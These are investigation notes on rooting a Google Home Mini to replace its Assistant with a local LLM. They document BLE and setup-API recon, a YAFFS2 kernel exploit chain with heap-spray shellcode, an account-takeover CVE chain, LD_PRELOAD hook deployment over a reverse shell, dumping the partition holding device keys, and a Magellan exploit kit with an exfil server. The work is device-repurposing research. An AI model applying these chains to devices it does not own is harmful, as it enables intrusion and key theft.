# googlehomemini — findings

Investigation into replacing the Google Assistant agent on a Google Home Mini with a
local LLM that can call arbitrary MCP servers.

## Question

1. What exactly is the device, and what interfaces can we reach it on?
2. Where does the Google Assistant agent actually run, and what would "replace it"
   mean at the firmware level?
3. Can the device be reflashed, or must it be repurposed as an I/O endpoint?

## Target

| Field | Value |
| --- | --- |
| Artifact | no firmware image yet — see `notes/firmware-plan.md` |
| Device | Google Home Mini, internal product name **`mushroom`** (E1) |
| Build | **`cast_build_revision` 3.75.468362**, `build_version` 468362 (E1) |
| BLE addr | rotating resolvable-private address — observed `4D:64:D0:63:0A:E2`, `73:5F:A9:7F:67:36`, `51:50:10:FA:5E:47` |
| Hardware MAC | `44:07:0B:D2:6F:36` (E1) |
| Hotspot BSSID | `FA:8F:CA:35:5C:46` — matches the advertised service data |
| SSDP UDN | `ad8442f8-f004-f4f4-44cb-ac11eb2d26f6` |
| LAN addr | none — device is not on Wi-Fi (`wpa_configured: false`) |
| Country / locale | `FR`, `fr` |
| Evidence | `evidence/20261026-*` (F19's capture is from a **different** Mini, see there) |

## Findings

### F1. The device is unprovisioned and not on any network

`evidence/20261026-103338-nmap-cast.txt` — a sweep of `192.168.1.0/24` for
`:8008`/`:8009` returns exactly one host, `192.168.1.12`.
`evidence/20261026-103338-cast-scan.json` — that host identifies itself via
`/setup/eureka_info` as `65" Neo QLED`, model `QN80D`, build `721674079`,
`release_track: stable-channel`. That is the TV, **not** the Mini.

From the other side, `127c6160` (OTA status) returns
`{"auto_reboot":true,"current_operation":"UPDATE_STATUS_IDLE","last_checked_time":"0",
"new_size":"0","new_version":"0.0.0.0","ready_to_apply":false}` — version
`0.0.0.0` and a zero size mean no update was ever fetched, i.e. never provisioned.

### F2. There is no USB data path

`lsusb` and `/sys/bus/usb/devices` show only the integrated Chicony camera and root
hubs; no Google VID (`18d1`) device enumerates, before or after replugging. The
micro-USB port on this generation is power-only, so USB is not an analysis or
flashing interface. **Confirming this needs a teardown** (UART pads), not `lsusb`.

### F3. The BLE setup service is fully readable without pairing

`evidence/20261026-103458-gatt-dump.json` — GATT tree: 3 services, `0x1800` (GAP),
`0x1801` (GATT), `0xfea0` (Google) with 34 characteristics.
`evidence/20261026-104934-ble-setup-dump.json` + `evidence/20261026-111855-gatt-decoded.txt`
— reads succeed with **no bonding, no encryption, no authentication**.

### E1. The device exposes its own open setup access point — full identity recovered

An unprovisioned Home Mini broadcasts an **open** AP whose BSSID is exactly the
`hotspot_bssid` from BLE, and serves the Google Home app's own setup API over
**HTTPS on `192.168.255.249:8443`** (and `http://…:8008`). No Google account, no app,
no BLE crypto handshake is needed to reach it.

`scripts/join-setup-ap.sh` joins that AP, dumps `eureka_info`, and restores the
previous Wi-Fi connection on exit. Results:
`evidence/20261026-133605-eureka-192.168.255.249-8443.json`,
`evidence/20261026-133839-setup-api.json`.

This resolved the remaining identity unknowns in one step:

```json
"detail":     {"model_name": "Google Home Mini", "manufacturer": "Google Inc.",
               "locale": {"display_string": "français"}},
"product_name": "mushroom",
"mac_address": "44:07:0B:D2:6F:36",
"cloud_device_id": "009CCF5F2B42B8E54BD50F2BB713692D",
"ssdp_udn": "ad8442f8-f004-f4f4-44cb-ac11eb2d26f6",
"weave_device_id": "",          // never joined Google's Weave fabric
"setup_state": 10, "wpa_state": 3, "wpa_configured": false,
"has_update": false, "release_track": "stable-channel", "version": 13,
"opt_in": {"crash": false, "opencast": false, "stats": false},
"tos_accepted": false, "uptime": 15174.6
```

**`product_name: "mushroom"` settles U2**: this is the Home Mini gen 1, i.e. the
Marvell Armada 1500 Mini Plus (88DE3006), dual Cortex-A7, ARMv7 little-endian — the
assumption that drove the Ghidra configuration was correct. Note gen 2 is a
*different* product name (`Google Nest Mini`), so this is conclusive, not inferred.

### E2. Setup API surface (GET-only enumeration)

Probed with `scripts/setup_api.py` (read-only; never POSTs):

| Endpoint | Result |
| --- | --- |
| `/setup/eureka_info` | 200, 1137 B |
| `/setup/eureka_info?options=detail` | 200, 1346 B (+`model_name`, `manufacturer`) |
| `/setup/eureka_info?options=detail&params=setup_state,device_info` | 200, 1904 B — **the full `device_info`**, incl. `product_name`, `model_name`, `weave_device_id` |
| `/setup/scan_results` | 200, 1192 B — the device's own Wi-Fi scan |
| `/setup/supported_timezones` | 200, 15984 B |
| `/setup/scan_wifi` | **405** → exists, POST-only |
| `/setup/get_app_device_id` | **405** → exists, POST-only |
| `/setup/offer` | 500 (GET not meaningful) |
| `/eureka_info`, `/setup/icon.png`, `/setup/log`, `/setup/device_info`, `/setup/capabilities`, … | 404 — not present |

So the setup server is a small, closed surface: `eureka_info`, `scan_results`,
`scan_wifi`, `get_app_device_id`, `offer`, plus the mutating endpoints the Home app
uses (`connect_wifi`, `set_eureka_info`, `reboot`). Nothing resembling a debug shell
or a firmware-read endpoint.

Two notes for the on-device track: `params=...` controls which sections are returned
(so the 512-byte BLE cap was a BLE-layer limit, not a device-data limit), and
`weave_device_id` being empty is consistent with a device that has never completed
Google activation.



### E3. Device identity and capabilities (from the BLE setup payloads)

Decoded with `scripts/decode_gatt.py`, which partially inflates the truncated gzip
streams (see U1). This is the substantive result of the BLE phase:

```json
"build_info": {"cast_build_revision": "3.75.468362"},
"device_info": {
  "capabilities": {
    "assistant_supported": true,
    "ble_supported": true, "bluetooth_supported": true,
    "bluetooth_audio_sink_supported": true, "bluetooth_audio_source_supported": true,
    "cloudcast_supported": true, "cloud_groups_supported": true,
    "hotspot_supported": true, "https_setup_supported": true,
    "setup_supported": true, "set_network_supported": true,
    "reboot_supported": true, "multizone_supported": true,
    "multiuser_supported": true, "preview_channel_supported": true,
    "secure_setup_enforcement_supported": false,
    "opencast_supported": false, "display_supported": false,
    "fdr_supported": false, "audio_hdr_supported": false
  },
  "cloud_device_id": "009CCF5F2B42B8E54BD50F2BB713692D",
  "factory_country_code": "FR",
  "hotspot_bssid": "FA:8F:CA:35:5C:46",
  "mac_address": "44:07:0B:D…",
  "public_key": "MIIBCgKCAQEA/tVvUlRi7rnbNlG8ZK5kjVr0NWlWvD0sAw1kVN3g0spCxbl4xflBKL92/9NlMiRQqwmYseSFBiCAYqiJMss36i1gJn/dxCRLNx3MlhHypj7FwOUeUVtxCVdbG4lGcKJqKybDnGJmsWodVWFO0bTb41hkwrAp4Pg3UuXjZczKLE5ZE4OomEF6rid8tdsRIKSjLympjwo79lLRqalKpg6sYQ73MKi3fk/pw+u5ey3z10CDYq1Dgd3IfcdS8nW9EcrFNUZ2t8itJe4PIXbC5uAuqoieL1Me6Fsp5uouGz67talX0tqsCeMh6VFUktaY56jImkNeg3xHTdo8OCZNEHZVYwIDAQAB"
},
"sign": {"certificate": "-----BEGIN CERTIFICATE-----\nMIIDzzCCAregAwIBAgIGTDM5SVJVMA0GCSqGSIb3DQEBCwUAMIGKMQswCQYDVQQG\nEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEWMBQGA1UEBwwNTW91bnRhaW4gVmll\ndzETMBEGA1UECgwKR29vZ2…"}
```

Read this carefully, because three lines decide the project:

- **`assistant_supported: true`** — the Assistant client is present on this device,
  as expected. This is the component to reason about.
- **`secure_setup_enforcement_supported: false`** — setup is *not* enforced over an
  authenticated channel, consistent with F3 (open GATT reads, and no bonding). So the
  provisioning path is not a trust boundary here.
- **`https_setup_supported: true`** — there is a local HTTPS setup API in addition to
  BLE. This is the route to the *full* (untruncated) device info, see U1.

`public_key` is a complete RSA-2048 SubjectPublicKeyInfo, and `sign.certificate` is a
Google-issued X.509 chain (serial `TDM59IRU`-ish, issuer `C=US, ST=California,
L=Mountain View, O=Goog…`). Together these are the device attestation material — the
same material a firmware signature check would rely on.

Cross-check on the advertise data: the service data observed in
`evidence/20261026-103338-ble-scan.json` is `03fa8fca355c466f2020209e43`, i.e.
`0x03` then `FA:8F:CA:35:5C:46` — byte-for-byte the `hotspot_bssid` above. The
advertisement leaks the setup hotspot identity, not a random token.

### E4. The device exposes your Wi-Fi environment to any passing BLE scanner

`157c6160` is a *complete*, readable Wi-Fi scan list — no pairing, no popup, no
consent, on a device that is merely powered on:

`AcquaProtectionWifi`, `EAPNEU_WIFI`, `KFC_LIV`, `Livebox-6890`, `Livebox-94D0`,
`Livebox-C5C0`, `WIFI_KFC` — with BSSIDs, frequencies, RSSI, `wpa_auth` and
`wpa_cipher` for each, including per-AP `ap_list` entries for multi-BSSID radios.

That is a real privacy observation, not just a recon convenience: an unprovisioned
Home Mini broadcasts the neighbourhood's SSID inventory to anyone in radio range.

### F4. The advertised address rotates, and BlueZ lies about connection state

Three operational traps, all hit and solved (baked into `scripts/ble_dump.py` and
`scripts/ble_notify.py`):

- The Mini advertises a **resolvable-private BLE address** that rotates (three
  different addresses observed in one session). Hard-coding a MAC fails within
  minutes. Resolve by name (`GoogleHome*`) or service `0xfea0` on every run.
- BlueZ reports `Connected: yes` on a **stale handle**, after which every read
  returns empty rather than an error. A canary read (device-name characteristic,
  always 14 bytes) is required to prove the link.
- A connected device **stops advertising**, and the device can also go quiet for
  minutes after repeated failed attaches. Disconnect stale `GoogleHome*` links, and
  if it stays silent, power-cycle the Mini.

### F5. `busctl` prints `ay` byte arrays in decimal, not hex

`scripts/ble_dump.py` originally parsed `busctl` output as hex and silently produced
corrupt values (gzip that would not decompress). `busctl` emits
`ay <count> <count decimal byte values>`. This made the first long-read attempt look
successful while returning nonsense.

### F6. The Assistant agent is not on the device

Nothing observed contradicts the standard Cast architecture: the Mini runs a Cast
receiver plus a streaming audio client; wake-word detection is on-device, but
**speech-to-text, the agent logic and text-to-speech all run in Google's cloud** over
TLS. There is no on-device LLM, and ~256 MB of RAM leaves no room for one. "Put an
LLM inside" therefore means *redirect or replace the audio pipeline*, not *install a
model* — see `notes/architecture.md`.

## Unknowns and limitations

- **U1 — RESOLVED.** The three BLE payloads are capped at exactly 512 bytes, and it
  is a firmware cap, not an ATT limit:
  - ATT offset reads past 512 return **0 bytes** (not an ATT error), so the
    attribute really is 512 bytes long;
  - `StartNotify` on those three returns **`Operation is not supported`** — they are
    read-only, so there is no notification escape hatch
    (`evidence/20261026-112044-ble-notify-probe.log`, reproducible);
  - writing an offset to the paired `xx6c` characteristic does **not** advance the
    window; each read restarts at the gzip header.
  `scripts/decode_gatt.py` sidesteps the cap by partially inflating the prefixes
  (1–1.4 KB of JSON), but it is no longer needed for identity: the open setup AP (E1)
  returns the full `device_info` over HTTPS, with no BLE handshake, hotspot PSK or app.
- **U2 — RESOLVED.** `product_name: "mushroom"` and `model_name: "Google Home Mini"`
  (E1) prove gen 1 `H0A`, i.e. Marvell Armada 1500 Mini Plus (88DE3006), ARMv7 LE —
  exactly what `scripts/ghidra-headless.sh` already targets.
- **U3 — PARTIALLY RESOLVED (F20).** The full 3.78.540761 `joplin-b4` OTA is downloaded
  and unpacked (rootfs, kernel, ramdisk). The target's own 3.75.468362 image is still missing.
  Earlier status: no firmware image yet.
  `scripts/fw-analyze.sh` and `scripts/ghidra-headless.sh` are verified end-to-end on
  a synthetic image only. Blocking prerequisite for everything except Piste 6.
- **U4 — verified boot exists; the bypass route is identified, not proven.** Published
  H0A research (F10) says `postbootloader` RSA/SHA256-verifies the kernel and the
  rootfs is SquashFS + dm-verity, so **Google's images cannot be patched in place**.
  The published exploit instead attacks the kernel from the `cache` partition (mtd8,
  YAFFS2, writable, outside the verified chain). Unverified on this unit — needs a
  NAND dump.
- **U5 — no UART, no JTAG, no USB data path.** Per published teardown (F9) gen 1 H0A
  has no accessible serial/debug pads (BGA only) and micro-USB is power-only (F2).
  **The UART boot-log shortcut is not available**; the only board-level route is
  physical NAND access (Piste 2).
- **U6 — NEW (F27). Are the Mini's micro-USB D+/D- lines routed/tappable?** The
  post-bootloader contains a full USB host + mass-storage boot path (`Booting from
  NAND failed, booting from USB`). Micro-USB is "power-only" in normal operation (F2),
  but if the data lines reach the SoC on the H0A PCB, the bootloader USB parsers
  (Piste 11) become reachable without opening the NAND. Needs a PCB probe / continuity
  test. Gates whether Piste 11 is a software-only or NAND-access attack.
- The two non-gzip blobs (`22216033…` 65 B, `2dab7a51…` 16 B) are high-entropy and
  undecoded — most likely handshake nonce/key material.
- Collection is stateful: **the setup service disappears once the device is
  provisioned.** Finish BLE evidence work before touching the Google Home app.

## Reconstruction plan

Two tracks, with very different risk:

- **Track A (days, no firmware risk):** keep the Mini as a Cast *speaker* and move
  the whole agent off-device — wake word, STT, LLM, MCP client, TTS on a home box.
  See `notes/architecture.md`; `scripts/cast_play.py` proves the speaker half works
  (validated against the TV on the LAN).
- **Track B (weeks, this REA investigation):** finish the setup-protocol
  reconstruction (U1), pin the model (U2), obtain firmware (U3), then decide on
  verified boot (U4) with `scripts/fw-analyze.sh` + Ghidra.

Track B's first deliverable is a decision, not code: *can this device run our code,
and at what cost?* Published research (Piste 2) already answers yes-or-no — the
answer is NAND, not signatures:

- **Track B1 — NAND root (Piste 2).** NandBug interposer + YAFFS2 `cache`-partition
  exploit → ring 0 → root shell → our client runs from an unverified rw partition.
  Soldered FPGA hardware; highest effort, only path that modifies *this* device.
- **Track B2 — drop-in PCB (Piste 6).** ESP32-S3 + XMOS board in the same shell,
  reusing the speaker and mic-mute button, running ESPHome → Assist → Wyoming →
  Whisper/LLM/Piper. No exploit, works immediately; the Google silicon is discarded.

Implementation details for B1 (what the device speaks, what to replace) are in
`notes/ondevice-plan.md`.

---

## Research findings (from internet research, 2026-10-26)

### F7. Build `3.75.468362` — YAFFS2 kernel exploit possibly applicable

`cast_build_revision` `3.75.468362` corresponds to a Linux 3.8.13 kernel on this
platform. The upstream YAFFS2 fix dates to **2014**; the Gen-1 H0A kernel of this
lineage is **reported vulnerable** by courk.cc's research.

**Confirmed on our unit (E1/E3):** `cast_build_revision` is exactly `3.75.468362`, and
`new_version: "0.0.0.0"` + `has_update: false` show the device has **never** taken an
OTA, so the factory kernel is what runs today.

**Still unverified on our unit:** that this build's kernel is inside the vulnerable
window. Only the NAND dump can tell us — read the kernel version string off mtd6.
Do not claim vulnerability before that.

### F8. Gen 2 SoC correction — Synaptics AS370, not Amlogic

Earlier notes said gen 2 (H2C, "Nest Mini") uses Amlogic S905D. **Incorrect.**
iFixit teardown and WikiDevi confirm: gen 2 H2C uses **Synaptics AS370** (AudioSmart).
Amlogic chips (S905D, A113X, A113D) are in the **Nest Hub** product line, not the
Nest Mini. Consequences:

- CVE-2023-48424 / CVE-2023-48426 (eMMC fault injection → U-Boot shell, earned
  $68 000 at HardPwn USA 2023) affect **Amlogic Chromecast/Nest Hub** devices — they
  do **not** apply to either gen 1 H0A or gen 2 H2C (Synaptics) Nest Mini.
- The haxx.in EL3 BootROM exploit is Amlogic-specific, also irrelevant.

### F9. No UART or JTAG pads on gen 1 H0A (confirmed by courk)

Courk specifically probed the gen 1 H0A board and found no accessible serial/debug
test points — all debug interfaces are BGA, not exposed. UART pinouts on XDA/Reddit
are for the **Nest Hub**, a different device. For H0A:
- micro-USB is power-only (F2).
- The only non-destructive hardware path is NAND physical access via NandBug or a
  NAND flash clip/programmer.

### F10. H0A partition map (from courk.cc research)

| mtd | Name | Notes |
| --- | --- | --- |
| mtd0 | block0 | BootROM DDR/ECC config |
| mtd1 | prebootloader | Low-level SoC init |
| mtd2/3 | tz / tz-b | A/B TrustZone |
| mtd4/5 | postbootloader | 640 KB; RSA/SHA256-verifies kernel. **Google released the source.** |
| mtd6 | kernel | Linux 3.8.13 (verified by postbootloader) |
| mtd7 | rootfs | SquashFS + dm-verity |
| **mtd8** | **cache** | **YAFFS2, rw — NOT in the verified boot chain. Exploit target.** |
| mtd9 | recovery | Factory reset |
| mtd10 | factory\_store | YAFFS2 ro; device TLS certs, serial, keys |
| mtd11 | fts | Key-value store |

`cache` (mtd8) and `factory_store` (mtd10) are outside the verified boot chain.

### F11. CVE-2023-48419 — account-linking chain (CVSS 10.0, patched for firmware ≥ 2.58)

Matt Kunze (2022, patched April 2021):
1. 802.11 deauth → device loses Wi-Fi → enters setup mode
2. `GET http://<ip>:8008/setup/eureka_info` (no auth) → returns `cloud_device_id`,
   `public_key`, `signed.certificate`
3. Attach attacker's Google account using those fields via the cloud API
4. Remote access: routines, mic activation, arbitrary commands

Fixed April 2021. CVE-2023-48419 (CVSS 10.0) covers firmware < 2.58; patched via
March 2024 OTA.

**Our unit should be patched for this:** on the same versioning scheme (major.minor)
`3.75.x` > `2.58`. Do not build the plan on it. E1/E2 reaching the setup API
pre-provisioning is the same *class* of exposure, but it is a diagnostic here — the
device is linked to no account, so there is nothing to take over.
Source: https://downrightnifty.me/blog/2022/12/26/hacking-google-home.html

### F12. BLE privacy observation — Wi-Fi environment disclosure

`157c6160` returns the full Wi-Fi scan list with zero authentication from any BLE
device in range: SSIDs (`AcquaProtectionWifi`, `KFC_LIV`, `Livebox-6890`, etc.),
BSSIDs, RSSI, WPA cipher and auth type. An unprovisioned Home Mini in a public space
broadcasts its neighbourhood's SSID inventory. Logged as a privacy observation, not
just a recon convenience (E4).

---

## Open pistes (next steps, ordered by effort)

### Piste 1 — Identify the model precisely (U2) — **DONE**

Resolved without hardware, via the open setup AP (E1):

```bash
./scripts/join-setup-ap.sh --api
curl -sk 'https://192.168.255.249:8443/setup/eureka_info?options=detail&params=setup_state,device_info'
```

`product_name: "mushroom"`, `model_name: "Google Home Mini"` ⇒ gen 1 H0A, Marvell
Armada 1500 Mini Plus. Ghidra already targets `ARM:LE:32:v7` accordingly. Kept as the
record of how it was obtained.

### Piste 2 — YAFFS2 kernel exploit via NandBug (H0A only, confirmed code execution)

The only published secure-boot bypass on this exact device class. Source: courk.cc.

**Attack surface:** `cache` partition (mtd8) — YAFFS2, writable, outside verified boot.
**Bug:** object-confusion in `yaffs2_scan_chunk` in Linux 3.8.13. Fixed upstream in
2014; the H0A kernel (all known builds ≤ 2021) never received the patch.

**Full chain:**
1. Build NandBug hardware: ICE40HX1K-TQ144 FPGA + FT2232H interposer soldered to the
   NAND (TC58NVG1S3HBAI6). Reads 256 MB in < 1 min.
   Hardware: https://github.com/courk/NandBug-Hardware
   Software: https://github.com/courk/NandBug-Software
2. Dump the NAND. BCH ECC: poly `0x8003`, strength 48, OOB 90 B/page; nibble-swap
   first 2080 bytes of each page before computing BCH, swap result back.
3. Write poisoned YAFFS2 image to mtd8: crafted chunk with same `obj_id` but
   mismatched `chunk_id` causes type confusion → `file_size` field becomes
   `children.next` pointer → overwrite `dev->tagger.read_chunk_tags_fn`.
4. Spray fake `yaffs_obj` structures + shellcode via `blob-base64` entries in
   `wpa_supplicant.conf` (kernel lowmem is NX-free; one-to-one v→p map,
   addresses ~`0xc0000000–0xddd00000`).
5. Boot: `init.rc` mounts `cache`; trigger fires → `call_usermodehelper_fns`:
   - `mount -o remount,rw,exec /factory_setting`
   - Execute your payload ELF from `factory_setting`
6. Root shell. **5–10 % success per boot** (heap spray). Power-cycle on failure.

Unbrick tool built on this research: https://github.com/juniperchow/unbrick-google-home-mini

### Piste 3 — JADX + Frida on Google Home APK (BLE trigger commands, U1 tail, U2)

The `0xfea0` write-characteristic command format is undocumented. Two paths:

**JADX static (days, no device):**
Search decompiled APK for `fea0`, `7c6160`, `fe40` — they appear literally in the BLE
manager class. The surrounding method reveals the exact trigger byte sequence and any
encryption/MAC on the command side.

**Frida dynamic (hours, needs Android phone with Google Home app):**
```bash
frida -U -n "com.google.android.apps.chromecast.app" -l frida-ble-hook.js
# hook android.bluetooth.BluetoothGatt.writeCharacteristic
```
Captures all writes to the setup service in plaintext. Run while the app provisions
any Cast device. Reference: Pen Test Partners BLE+Frida guide.

The HTTPS setup API (`https_setup_supported: true`, hotspot `FA:8F:CA:35:5C:46`,
port 8443) would give the full untruncated `197c/1a7c/1b7c` payloads, but it needs
the hotspot PSK from the BLE handshake — same target.

### Piste 4 — NAND CS# fault injection (glitch into U-Boot shell)

DirectDefense/oddsolutions on the Pixel Tablet Dock (AML A113D) showed that a brief
high pulse on NAND CS# at the right boot window drops U-Boot to an interactive shell,
bypassing Secure Boot. They state it "seems to affect multiple other Nest devices."
Gen 1 H0A uses Marvell, so exact timing differs, but the technique class is
architecture-independent. Tools reference:
https://github.com/oddsolutions/korlan-secure-boot-bypass

### Piste 5 — Postbootloader source audit (U4 assessment)

Google released the H0A `postbootloader` source (~640 KB binary at mtd4/5). Audit it
for the same class of parser bugs as the Nest Hub U-Boot stack overflow
(fredericb.info, 2022): stack buffer overflows in FAT/partition/USB block parsers.
The Nest Hub bug was fixed upstream in 2011, reintroduced 2018, fixed by Google in
December 2021 — the Mini's postbootloader may be on a similarly stale upstream. If
the postbootloader parses USB blocks, a Raspberry Pi Pico delivering an oversized
block at boot is the attack delivery mechanism.

### Piste 6 — MiciMike drop-in PCB (no-exploit path, working voice bot immediately)

Open-source ESP32-S3 + XMOS XU316 replacement mainboard, physically fits in the gen 1
enclosure, reuses speaker + fabric shell + mic mute button. Ships with ESPHome →
Home Assistant Assist → Wyoming → Whisper STT + local LLM + Piper TTS + MCP.
~$85 on Crowd Supply, or self-fab from open-source gerbers (CERN-OHL-S v2).
GitHub: https://github.com/iMike78/home-mini-v1-drop-in-pcb
**If you want a working local LLM voice bot in the Mini's shell with zero firmware
risk, this is the weekend path.**

### Piste 7 — Track A software stack (working today, no hardware risk)

Pipeline that works right now with your Pi + DeepSeek:

```
ESP32-S3 mic or ReSpeaker HAT
  → openWakeWord (wake word detection)
  → wyoming-whisper (STT, Docker on Pi)
  → DeepSeek / local LLM via Ollama
  → MCP client pool (arbitrary MCP servers)
  → wyoming-piper (TTS)
  → pychromecast → Mini speaker (Cast audio URL)
```

`glocaltokens` Python library extracts local Cast auth tokens post-provisioning.
Home Assistant Assist orchestrates the Wyoming stack natively if you run HA.
Small LLMs that fit a Pi 4/5: `llama3.2:3b`, `qwen3:4b`, `gemma3:4b` via Ollama.

---

## Late findings (post-research, 2026-10-26)

### F13. `cast_shell` and `libassistant.so` — the exact audio intercept targets

After root (Track B1), the two files that matter:

| File | Path | Role |
| --- | --- | --- |
| Cast receiver | `/system/chrome/cast_shell` | Main process — Cast protocol, audio stack, wake word |
| Google Assistant gRPC client | `/system/chrome/lib/libassistant.so` | Sends 16kHz 16-bit PCM in AssistRequest, receives AssistResponse |

`libassistant.so` calls `google.assistant.embedded.v1alpha2.EmbeddedAssistant.Assist` at
`embeddedassistant.googleapis.com:443` (TLS, BoringSSL). Audio format: 16 kHz, 16-bit, mono.

> **Contradicted 2026-11-07 (F19), on a second Mini (build 3.78.540761, not the
> 3.75.468362 target):** on the wire that device does **not** use EmbeddedAssistant
> v1alpha2. Assistant traffic is Google-internal **S3**:
> `speech.s3.S3StubbyClientConnectorService/S3Bidi` on `assistant-s3-pa.googleapis.com`,
> plus `google.internal.speech.S3OnePlatform/Assistant` on `embeddedassistant.googleapis.com`
> for Voice Match enrollment. 16 kHz is confirmed (audio config field = 16000.0). The S3
> schema is not public, so a v1alpha2-speaking replacement endpoint would not be understood.
> The target unit is presumably the same, since it is the same `libassistant` client
> family, but that is not observed on 3.75.468362.

Three post-root intercept strategies, ordered by invasiveness:

1. **LD_PRELOAD hook** (`reconstruction/payload/libassist_hook.c`): intercepts `write()`
   / `SSL_write()` calls carrying gRPC AssistRequest frames, tees raw PCM to a UDP socket
   on the Pi. The Pi-side server (`reconstruction/agent/pi_whisper_server.py`) runs
   Whisper → LLM → Piper and sends a Cast-playable URL back. `cast_shell` stays running
   and handles Cast auth — only the cloud leg is replaced.
2. **`libassistant.so` stub replacement**: remove or rename the real `.so`, drop in a
   stub that opens a TCP socket to the Pi and streams raw PCM. Clean but requires
   remounting `/system` rw.
3. **tinyalsa direct capture**: bypass `cast_shell` entirely — run `tinycap` against the
   ALSA PCB device (`/dev/snd/pcmC0D0c`), pipe to Pi Whisper, play TTS back via
   `tinyplay`. No gRPC touched.

**Preferred path post-root:** LD_PRELOAD (option 1). Leaves `cast_shell` auth intact,
survives reboots with a one-line `init.d` patch, and reverting is `rm` + power-cycle.

Deploy steps are in `reconstruction/payload/libassist_hook.c` header.

### F14. Setup hotspot is open — no PSK needed (confirmed by historical analysis)

The setup AP (`FA:8F:CA:35:5C:46`, SSID `GoogleHome4983` or similar) **has no WPA2
password**. This is documented historical Chromecast behaviour: the hotspot BSSID is in
the BLE advertisement precisely so the phone can join without a GATT read — if a PSK
were needed, it would be in the GATT payload.

**We already confirmed this** (E1): `scripts/join-setup-ap.sh` joined the hotspot without
any PSK and retrieved the full `eureka_info` from `https://192.168.255.249:8443`.

Implication for Piste 3: the "HTTPS setup API needs the BLE PSK" concern was a red
herring. The setup API is fully accessible via the open hotspot, and E1/E2 collected
that data. The only thing BLE is still needed for is capturing the exact `fe40` write
format for triggering a provisioning command (Piste 3), which requires the Android HCI
snoop or Frida approach regardless.

### F15. BLE `fe40` write format — no public documentation; HCI snoop is the shortest path

No researcher has published the exact byte format of `WriteValue` calls to the
`0xfea0`/`0xfe40` setup characteristics. Two acquisition methods:

**Android HCI snoop log (fastest, no jailbreak):**
1. Developer Options → *Bluetooth HCI snoop log* → ON.
2. Run through a provisioning attempt with the Google Home app.
3. `adb pull /data/misc/bluetooth/logs/btsnoop_hci.log`.
4. Wireshark → filter `btatt` → every `WriteValue` to `fe40`/`7c6160` is in plaintext.

**Frida (same result, real-time):**
```bash
frida -U -n "com.google.android.apps.chromecast.app" \
  -l frida-ble-hook.js
# hook android.bluetooth.BluetoothGatt.writeCharacteristic
```

Wi-Fi PSK delivery: the Wi-Fi password is **RSA-2048-encrypted with the device's
`public_key` from `eureka_info`** before being POSTed to the setup API. We already have
the public key (E3, `1a7c6160`). The POST endpoint is `/setup/connect_wifi`; the
exact protobuf encoding is the remaining unknown.

### Piste 8 — LD_PRELOAD audio intercept (post-root, production Track B path)

Once Track B1 delivers a root shell:

```bash
# Cross-compile the hook for ARMv7
arm-linux-gnueabi-gcc -shared -fPIC -nostartfiles -Os \
  -o libassist_hook.so reconstruction/payload/libassist_hook.c

# Start the Pi listener (runs Whisper → LLM → TTS, receives PCM from Mini)
python3 reconstruction/agent/pi_whisper_server.py &

# Deploy to the Mini (from root shell via reverse shell)
cp libassist_hook.so /factory_setting/
sed -i 's|exec cast_shell|LD_PRELOAD=/factory_setting/libassist_hook.so exec cast_shell|' \
  /etc/init.d/S80cast_shell
reboot
```

After reboot the Mini speaks to your Pi instead of Google's cloud. The only change
visible externally is that `embeddedassistant.googleapis.com` traffic disappears and a
UDP stream appears on the LAN.

Also of interest for this piste: `factory_store` (mtd10) contains the device's unique
TLS client cert and private key. **Dump this first** (`nanddump -f /tmp/fstore.bin /dev/mtd10`)
before any write operations — losing it permanently breaks Cast device authentication.

---

## Pure-software exploit chain (no hardware required)

### F16. Magellan — **ALMOST CERTAINLY PATCHED** on build 3.75.468362

**CVEs:** CVE-2018-20346, CVE-2018-20505, CVE-2018-20506  
**Source:** Tencent Blade Team, DEF CON 27 / Black Hat USA 2019  

**REVISED assessment (2026-10-26, after cert decode):** The device TLS certificate was issued
**2018-09-05** (decoded from `sign.certificate` in `eureka_info`). Certificate issuance = factory
programming date. This device was manufactured **90 days before Chrome 71** (2018-12-04) and has
**never taken an OTA** (`has_update: false`, `new_version: "0.0.0.0"`). **Magellan IS applicable.**

The earlier estimate of "2023-2024 build" was wrong — the 3.75.x build number sequence is
device-class-specific, not an absolute global counter comparable to current production builds.
The device cert is the authoritative source for manufacture date.

Evidence: `evidence/20261026-133839-setup-api.json` → `sign.certificate` → `notBefore: 2018-09-05T05:06:08Z`

**The Cast LAUNCH delivery mechanism still works** — `cast_launch.py` successfully pushes
arbitrary URLs to `cast_shell`'s Chromium renderer with zero auth. That JS execution primitive
is the foundation for other Chrome n-day attacks once we know the exact Chromium version.

**How to confirm the Chrome version (run this NOW):**
```bash
bash scripts/probe-on-hotspot.sh
# Or: provision first, then cast_launch.py <mini-ip> http://pi:8080/probe.html
# probe.html reports navigator.userAgent → exact Chrome build number
```

**Cast port 8009 is only available after provisioning** — the setup hotspot only serves
the setup API (8443/8008). Cast receiver is not active while unprovisioned.
**Provision onto Pi AP first (scripts/provision-wifi.py), then run cast_launch.py.**

**Step sequence:**
```bash
# 1. Provision (one-time)
sudo bash scripts/lab-ap.sh start
python3 scripts/provision-wifi.py --ssid gh-lab --pass ghlab12345
# Note Mini's IP from DHCP log (10.42.0.x)

# 2. Run the probe — confirms SQLite version
python3 reconstruction/exploit/magellan/exfil_server.py --ip 10.42.0.1
python3 reconstruction/exploit/magellan/cast_launch.py \
    10.42.0.100 http://10.42.0.1:8080/probe.html
# Expected: "SQLite 3.2x.x | FTS3: YES | Magellan: VULNERABLE"
```

**Files:**
- `reconstruction/exploit/magellan/cast_launch.py` — sends Cast LAUNCH over port 8009
- `reconstruction/exploit/magellan/probe.html` — confirms SQLite version + FTS3 via WebSQL
- `reconstruction/exploit/magellan/magellan.html` — Phase 1 (version check) + Phase 2 (crash trigger) + Phase 3 scaffold (RCE, needs binary offsets)
- `reconstruction/exploit/magellan/exfil_server.py` — Pi-side HTTP server that serves pages and logs exfil POSTs from the device

**PoC status:** Tencent did not release exploit code. Phase 3 of `magellan.html` requires the
`cast_shell` binary's `system()` PLT offset and a writable function pointer reachable from the
FTS3 heap path. These must be extracted from the binary via Ghidra.

### F17. `/setup/connect_wifi` exact format — RSA PKCS#1 v1.5 `enc_passwd`

Source: GHLocalApi, interfect gist, GHLocalApi issue #88.

The correct JSON payload for provisioning:
```json
{
  "bssid":      "<AP BSSID>",
  "signal_level": -40,
  "ssid":       "<AP SSID>",
  "wpa_auth":   7,
  "wpa_cipher": 4,
  "enc_passwd": "<base64(PKCS1v15_encrypt(psk, device_public_key))>"
}
```

Padding is **PKCS#1 v1.5** (NOT OAEP). We have the device's `public_key` from E3.
